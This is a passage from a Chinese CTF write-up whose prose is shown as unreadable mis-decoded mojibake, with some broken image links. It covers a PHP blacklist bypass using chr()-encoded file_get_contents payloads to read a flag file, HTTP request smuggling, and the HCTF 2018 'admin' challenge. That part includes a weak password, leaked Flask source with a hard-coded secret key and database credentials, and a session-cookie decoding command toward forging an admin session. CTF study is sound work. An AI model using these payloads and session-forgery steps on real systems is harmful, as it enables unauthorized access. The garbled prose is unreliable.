src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604195744654.png"></p><p>ä¸ºç©ºï¼æ³¨æ„åˆ°åˆšåˆšcalc.phpçš„é»‘åå•ï¼Œç»•è¿‡è¿™ç§æ­£åˆ™åŒ¹é…çš„æ–¹æ³•æ¯”è¾ƒå¤šï¼Œä½†ä¸ä¸€å®šæœ‰æ•ˆï¼Œå±¡è¯•ä¸çˆ½çš„æ˜¯ç”¨ä»£ç æ‰§è¡Œé¡ºåºçš„é€»è¾‘æ¼æ´ï¼Œå³æ§åˆ¶è¾“å…¥çš„å†…å®¹ä¸ºä¸€ä¸ªå¾…æ‰§è¡Œå‡½æ•°ï¼Œç„¶åé»‘åå•åŒ¹é…ä¸åˆ°å­—ç¬¦ä¸²ï¼Œä»£ç ç»§ç»­æ‰§è¡Œä¸‹å»æ—¶ï¼Œæ‰ä¼šè§£æè¾“å…¥å†…å®¹ä¸­çš„å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨asciiè½¬æ¢ å³ä½¿ç”¨chr() å‡½æ•°ä»£æ›¿å­—ç¬¦</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604200222049.png"></p><p>çœ‹åˆ°æœ‰flagäº†</p><p>å¹²è„†å°±ç”¨chr()ä»£æ›¿æ‰€æœ‰å­—ç¬¦å§</p><p>è¯»å–<code>file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code></p><p>æä¸€å˜´ä¸€äº›èŠ±å¼è¯»å–æ–‡ä»¶çš„æ“ä½œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">show_source()<br>print_r(strip_whitespace())<br>readfile()<br>var_dump(file())<br><span class="hljs-keyword">include</span>()<br></code></pre></td></tr></table></figure><p>æ‹¼æ¥å³å¯<img src="https://raw.githubusercontkil3rr/photoie/photo/main/image-20210604201849759.png"></p><ul><li><p>æ–¹æ³•äºŒã€HTTPèµ°ç§æ”»å‡»(HTTPæ•°æ®æ¥æ”¶ä¸åŒæ­¥æ”»å‡»)</p><p><strong>æ¼æ´å½¢æˆçš„åŸå› ï¼š</strong></p></li></ul><p>å‰ç«¯æœåŠ¡å™¨ï¼ˆcdnï¼‰å’Œåç«¯æœåŠ¡å™¨æ¥æ”¶æ•°æ®ä¸åŒæ­¥ï¼Œå¼•èµ·å¯¹å®¢æˆ·ç«¯ä¼ å…¥çš„æ•°æ®ç†è§£ä¸ä¸€è‡´ï¼Œä»è€Œå¯¼è‡´æ¼æ´ï¼›ä¸ºä»€ä¹ˆä¼šä¸ä¸€è‡´å‘¢ï¼Ÿ</p><p>ä¸»è¦æ˜¯å¤„ç†Content-Lengthå’ŒTransfer-Encodingä¸ä¸€è‡´ï¼ŒåŸåˆ™ä¸ŠåŒæ—¶ä½¿ç”¨ä¸¤è€…æ—¶ï¼ŒContent-Lengthæ˜¯æ— æ•ˆçš„ï¼Œå½“å•ä¸ªæœåŠ¡å™¨æ—¶ï¼Œæ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†å½“å¤šä¸ªæœåŠ¡å™¨æ—¶ï¼Œç†è§£çš„æ•°æ®ä¸ä¸€è‡´æ—¶ï¼Œå°±ä¼šå‡ºç°æœ‰äº›æœåŠ¡å™¨è®¤ä¸ºContent-Lengthçš„é•¿åº¦æœ‰æ•ˆï¼Œæœ‰äº›ä»¥Transfer-Encodingæœ‰æ•ˆï¼Œè¿™æ ·è¶…å‡ºçš„é•¿åº¦å°±ä¼šæ‹¼æ¥åˆ°ä¸‹ä¸€æ¬¡è¯·æ±‚ï¼Œä»è€Œå¯¼è‡´æ¼æ´ã€‚</p><ul><li><input checked="" disabled="" type="checkbox"> Content-Typeé‡å¤ç»•è¿‡WAF</li></ul><p>?num=phpinfo();æŠ“åŒ…<code>æ³¨æ„æ­¤å¤„å˜é‡numå‰æ²¡æœ‰ç©ºï¿½ ï¿½</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213630379.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213654358.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604213744574.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210604214116207.png"></p><p>å…¶ä»–èµ°ç§çš„å§¿åŠ¿ å…·ä½“è§httpèµ°ç§æ”»å‡».mdå’Œhttp-desync-attacks-ppt.pdf</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="æ–¹æ³•ä¸€ã€å¼±å¯†ç "><a href="#æ–¹æ³•ä¸€ã€å¼±å¯†ç " class="headerlink" title="æ–¹æ³•ä¸€ã€å¼±å¯†ç "></a>æ–¹æ³•ä¸€ã€å¼±å¯†ç </h3><p>admin/123</p><p>æˆ‘åªèƒ½è¯´è¿™é¢˜å¤ªéš¾äº†</p><h3 id="æ–¹æ³•äºŒã€sessionä¼ªé€ "><a href="#æ–¹æ³•äºŒã€sessionä¼ªé€ " class="headerlink" title="æ–¹æ³•äºŒã€sessionä¼ªé€ "></a>æ–¹æ³•äºŒã€sessionä¼ªé€ </h3><p>ç†Ÿæ‚‰å„åŠŸèƒ½ç‚¹</p><p>æŸ¥çœ‹é¦–é¡µæºç </p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main//2021/06/08/.png"></p><p>è¯´æ˜è¿™é¢˜éœ€è¦adminç™»å½• è·å¾—flag</p><p>ç»§ç»­æµ‹è¯•å„åŠŸèƒ½ç‚¹ å¹¶æŸ¥çœ‹æºç  ç»ˆäºå‘ç°change passwordæºç ä¸­å‡ºç°ç½‘ç«™æºç æ³„éœ²</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002321159.png"></p><p>å¯è§æ˜¯flaskæ¨¡æ¿ ç™¾åº¦ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20210608002450573.png"></p><p>ä¸‹è½½åçš„æºç åŒ…éå†åï¼Œroutes.pyå’Œconfig.pyæ˜¯å¯ä»¥åˆ©ç”¨çš„ç‚¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#routes.py</span><br><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, url_for, flash, request, redirect, session, make_response<br><span class="hljs-keyword">from</span> flask_login <span class="hljs-keyword">import</span> logout_user, LoginManager, current_user, login_user<br><span class="hljs-keyword">from</span> app <span class="hljs-keyword">import</span> app, db<br><span class="hljs-keyword">from</span> config <span class="hljs-keyword">import</span> Config<br><span class="hljs-keyword">from</span> app.models <span class="hljs-keyword">import</span> User<br><span class="hljs-keyword">from</span> forms <span class="hljs-keyword">import</span> RegisterForm, LoginForm, NewpasswordForm<br><span class="hljs-keyword">from</span> twisted.words.protocols.jabber.xmpp_stringprep <span class="hljs-keyword">import</span> nodeprep<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> code <span class="hljs-keyword">import</span> get_verify_code<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/code&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">get_code</span>():</span><br>    image, code = get_verify_code()<br>    <span class="hljs-comment"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span><br>    buf = BytesIO()<br>    image.save(buf, <span class="hljs-string">&#x27;jpeg&#x27;</span>)<br>    buf_str = buf.getvalue()<br>    <span class="hljs-comment"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span><br>    response = make_response(buf_str)<br>    response.headers[<span class="hljs-string">&#x27;Content-Type&#x27;</span>] = <span class="hljs-string">&#x27;image/gif&#x27;</span><br>    <span class="hljs-comment"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span><br>    session[<span class="hljs-string">&#x27;image&#x27;</span>] = code<br>    <span class="hljs-keyword">return</span> response<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">index</span>():</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, title = <span class="hljs-string">&#x27;hctf&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/register&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">register</span>():</span><br><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = RegisterForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():<br>            flash(<span class="hljs-string">&#x27;Wrong verify code.&#x27;</span>)<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form=form)<br>        <span class="hljs-keyword">if</span> User.query.filter_by(username = name).first():<br>            flash(<span class="hljs-string">&#x27;The username has been registered&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;register&#x27;</span>))<br>        user = User(username=name)<br>        user.set_password(form.password.data)<br>        db.session.add(user)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;register successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;register.html&#x27;</span>, title = <span class="hljs-string">&#x27;register&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">login</span>():</span><br>    <span class="hljs-keyword">if</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br><br>    form = LoginForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(form.username.data)<br>        session[<span class="hljs-string">&#x27;name&#x27;</span>] = name<br>        user = User.query.filter_by(username=name).first()<br>        <span class="hljs-keyword">if</span> user <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> user.check_password(form.password.data):<br>            flash(<span class="hljs-string">&#x27;Invalid username or password&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>        login_user(user, remember=form.remember_me.data)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, title = <span class="hljs-string">&#x27;login&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/logout&#x27;</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">logout</span>():</span><br>    logout_user()<br>    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&#x27;/index&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/change&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">change</span>():</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> current_user.is_authenticated:<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    form = NewpasswordForm()<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        name = strlower(session[<span class="hljs-string">&#x27;name&#x27;</span>])<br>        user = User.query.filter_by(username=name).first()<br>        user.set_password(form.newpassword.data)<br>        db.session.commit()<br>        flash(<span class="hljs-string">&#x27;change successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;change.html&#x27;</span>, title = <span class="hljs-string">&#x27;change&#x27;</span>, form = form)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/edit&#x27;</span>, methods = [<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>():</span><br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br><br>        flash(<span class="hljs-string">&#x27;post successful&#x27;</span>)<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;edit.html&#x27;</span>, title = <span class="hljs-string">&#x27;edit&#x27;</span>)<br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">page_not_found</span>(<span class="hljs-params">error</span>):</span><br>    title = unicode(error)<br>    message = error.description<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;errors.html&#x27;</span>, title=title, message=message)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">strlower</span>(<span class="hljs-params">username</span>):</span><br>    username = nodeprep.prepare(username)<br>    <span class="hljs-keyword">return</span> username<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#config.py</span><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Config</span>(<span class="hljs-params"><span class="hljs-built_in">object</span></span>):</span><br>    SECRET_KEY = os.environ.get(<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;ckj123&#x27;</span><br>    SQLALCHEMY_DATABASE_URI = <span class="hljs-string">&#x27;mysql+pymysql://root:adsl1234@db:3306/test&#x27;</span><br>    SQLALCHEMY_TRACK_MODIFICATIONS = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>ä»routes.pyå…¥æ‰‹çœ‹ä¸€ä¸‹index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html">#index.html &#123;% include(&#x27;header.html&#x27;) %&#125; &#123;% if current_user.is_authenticated %&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Hello &#123;&#123; session[&#x27;name&#x27;] &#125;&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125; &#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27;<br>%&#125;<br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>&#123;% endif %&#125;<br><span class="hljs-comment">&lt;!-- you are not admin --&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav&quot;</span>&gt;</span>Welcome to hctf<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><br>&#123;% include(&#x27;footer.html&#x27;) %&#125;<br></code></pre></td></tr></table></figure><p>å¯è§ sessionå€¼æ˜¯adminæ—¶ æˆ‘ä»¬å³å–å¾—flag é‚£ä¹ˆè¿™å°±æ¶‰åŠsessionä¼ªé€  åœ¨routes.pyæ‰¾åˆ°<code>login</code>å¤„çš„<code>current_user.is_authenticated</code>é€šè¿‡GETæˆ–è€…POSTç™»å½•éƒ½å¯ä»¥ ç°åœ¨è¦è§£å†³çš„å°±æ˜¯sessionçš„é—®é¢˜</p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹<img src="https://raw.githubusercokil3rr/photo02ie/photo/main/image-20210608100040088.png"></p><p>ç™¾åº¦å†æ¬¡æŸ¥æ‰¾flaskæ¡†æ¶çš„sessioné—®é¢˜</p><blockquote><p>flaskçš„sessionæ˜¯é€šè¿‡åŠ å¯†ä¹‹åæ”¾åˆ°äº†cookieä¸­ã€‚æ‰€ä»¥æœ‰åŠ å¯†å°±æœ‰å¯†é’¥ç”¨äºè§£å¯†ï¼Œæ‰€ä»¥ï¼Œåªè¦ç”¨åˆ°äº†flaskçš„sessionæ¨¡å—å°±ä¸€å®šè¦é…ç½®â€œSECRET_KEYâ€è¿™ä¸ªå…¨å±€å®ã€‚ä¸€èˆ¬è®¾ç½®ä¸º24ä½çš„å­—ç¬¦ã€‚é…ç½®æ–¹æ³•ä¸€èˆ¬æœ‰ä¸¤ç§ã€‚</p><p>é…ç½®æ–¹æ³•ä¸€ï¼š</p><p>æ–°å»ºä¸€ä¸ªconfig.pyçš„æ–‡ä»¶é…ç½®secret_key</p><p>config.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">SECRET_KEY = <span class="hljs-string">&#x27;XXXXXXXXX&#x27;</span><br></code></pre></td></tr></table></figure><p>ç„¶ååœ¨ä¸»è¿è¡Œæ–‡ä»¶é‡Œé¢æ·»åŠ configæ–‡ä»¶é‡Œé¢çš„å†…å®¹ã€‚</p><p>main.pyæˆ–è€…routes.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br><span class="hljs-keyword">import</span> config<br>app = Flask(__name__)<span class="hljs-number">1.2</span><span class="hljs-number">.3</span><span class="hljs-number">.4</span>.<br></code></pre></td></tr></table></figure><p>é…ç½®æ–¹æ³•äºŒï¼š</p><p>ç›´æ¥åœ¨ä¸»è¿è¡Œæ–‡ä»¶é‡Œé¢é…ç½®ã€‚é…ç½®configçš„æ—¶å€™ä¹Ÿæ˜¯å’Œæ“ä½œå­—å…¸æ˜¯ä¸€æ ·çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#encoding: utf-8</span><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask,session<br>app = Flask(__name__)<br><br><span class="hljs-comment">#keyå€¼å¯ä»¥ä½¿ç”¨éšæœºæ•°ï¼Œæˆ–è€…è‡ªå®šä¹‰</span><br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-string">&#x27;XXXXX&#x27;</span><br>æˆ–è€…éšæœºæ•°<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="hljs-number">24</span>)<br>æˆ–è€…<br>app.secret_key = <span class="hljs-string">&#x27;why would I tell you my secret key?&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>æ‰€ä»¥ä¼ªé€ sessionå°±éœ€è¦å…¨å±€å®<code>SECRET_KEY</code></p><p>æ­¤æ—¶çš„config.pyé‡Œé¢å°±æ˜¯<strong>ckj123</strong></p><blockquote><p>SECRET_KEY = os.environ.get(â€˜SECRET_KEYâ€™) or â€˜ckj123â€™ #os.environ.get()å‡½æ•°çš„ä½œç”¨æ˜¯è·å–ç³»ç»Ÿçš„ç¯å¢ƒå˜é‡</p></blockquote><p>è¯´åˆ°è¿™é‡Œ æš‘å‡åº”è¯¥å­¦å‡ ä¸ªä¸»æµçš„webæ¡†æ¶</p><p>ä½¿ç”¨å·¥å…·<a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a></p><blockquote><p>ç”¨æ³•</p><h3 id="Encode"><a href="#Encode" class="headerlink" title="Encode"></a>Encode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;.<span class="hljs-keyword">py</span> encode [-h] -s <span class="hljs-symbol">&lt;string&gt;</span> -t <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -t <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-structure <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie structure<br></code></pre></td></tr></table></figure><h3 id="Decode"><a href="#Decode" class="headerlink" title="Decode"></a>Decode</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage: flask_session_cookie_manager.<span class="hljs-keyword">py</span> decode [-h] [-s <span class="hljs-symbol">&lt;string&gt;</span>] -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span><br><br>optional <span class="hljs-keyword">argument</span><span class="hljs-variable">s:</span><br>  -h, --<span class="hljs-keyword">help</span>            show this <span class="hljs-keyword">help</span> message <span class="hljs-built_in">and</span> <span class="hljs-keyword">exit</span><br>  -s <span class="hljs-symbol">&lt;string&gt;</span>, --secret-key <span class="hljs-symbol">&lt;string&gt;</span><br>                        Secret key<br>  -<span class="hljs-keyword">c</span> <span class="hljs-symbol">&lt;string&gt;</span>, --cookie-value <span class="hljs-symbol">&lt;string&gt;</span><br>                        Session cookie value<br></code></pre></td></tr></table></figure></blockquote><p>ä½¿ç”¨å·¥å…· æ”¾å…¥sessionå’Œå¯†é’¥è¿›è¡Œè§£å¯†</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">pytho<span class="hljs-symbol">n3</span> .\flask_sessio<span class="hljs-symbol">n_cookie_manager3</span>.py decode -c <span class="hljs-string">&quot;.eJw9kMFqwkAQhl-lzNlD3NiL4KGStCQwk8suw-xFrMYka2IhKhtXfPduLXgahv_j45-5w-Yw1ucWlpfxWs9g0-1heYe3b1iCZfHI-YT82WG2P4qyjhgT1GuHCpOK85SydV_puGm8EVNHquytLjwpVKKLmyizsM74yA3oipRC6yyTE2d70dRZLZFDRa7scSgmdDJZLnthSavsI6DKPekmFW08DnlSaQlxegl9S2wdhthPNyt4zGB3Hg-by8-xPr1OoIARl4S-ihT1boHavKMrW5uJrzLzp4l1j8FyfhPOg7BtbbN66rph29Qvk-H9ZPx_ctoOMYC5SmEG13M9Pr8G8wQevyIRbIY.YL7OEw.x49ZKtawASOf-9J3S9O9bWjVgTE&quot;</span> -s <span class="hljs-string">&quot;ckj123&quot;</span><br></code></pre></td></tr></table></figure><p>å¾—åˆ°</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: b&#x27;ef01a11ab07dcfc5c410c3c49a740e<span class="hljs-number">936132</span>5cb7bee207c6a22ce8f<span class="hljs-number">5040</span>f<span class="hljs-number">2277</span>8ceccb6ea3be66a<span class="hljs-number">3662</span>e2b<span class="hljs-number">1261</span>ebeaf<span class="hljs-number">7803</span>3a<span class="hljs-number">0587</span>a502a<span class="hljs-number">4963</span>2a0c9a5fc<span class="hljs-number">3111</span>8&#x27;, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;, &#x27;user_id&#x27;: &#x27;10&#x27;&#125;&#123;&#x27;_fresh&#x27;: False, &#x27;csrf_token&#x27;: b&#x27;<span class="hljs-number">7332</span>f44b<span class="hljs-number">71781592</span>2ad<span class="hljs-number">6085</span>0c9ee93ea2aa3afaf&#x27;, &#x27;image&#x27;: b&#x27;QgqS&#x27;, &#x27;name&#x27;: &#x27;123&#x27;&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åä¼ªé€ adminçš„session</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#123;&#x27;_fresh&#x27;: True, &#x27;_id&#x27;: 